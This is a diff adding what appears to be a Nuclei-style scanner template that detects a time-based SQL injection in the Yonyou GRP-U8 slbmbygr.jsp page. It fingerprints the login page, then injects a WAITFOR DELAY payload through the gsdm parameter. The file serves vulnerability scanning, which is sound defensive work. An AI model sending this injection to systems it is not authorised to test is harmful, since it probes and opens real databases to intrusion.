@@ -1,0 +1,41 @@
+id: poc-yaml-grp-u8-slbmbygr-jsp-sqli
+info:
+  name: 用友-GPR-U8 slbmbygr.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: GRP-U8
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "用友GRP-U8"
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/u8qx/slbmbygr.jsp?gsdm=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
